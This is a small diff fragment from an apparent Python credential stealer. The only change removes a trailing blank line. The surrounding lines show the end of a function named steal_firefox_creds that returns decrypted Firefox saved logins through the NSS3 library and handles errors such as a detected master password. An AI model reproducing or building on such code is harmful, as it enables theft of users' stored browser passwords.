@@ -123,4 +123,3 @@ def steal_firefox_creds(): # get firefox credentials
         return __decrypt_firefox_creds(nss3, logins)
     except (NSS3NotFoundError, NSS3KeySlotCreationError, MasterPasswordDetected) as e:
         return e.message
-
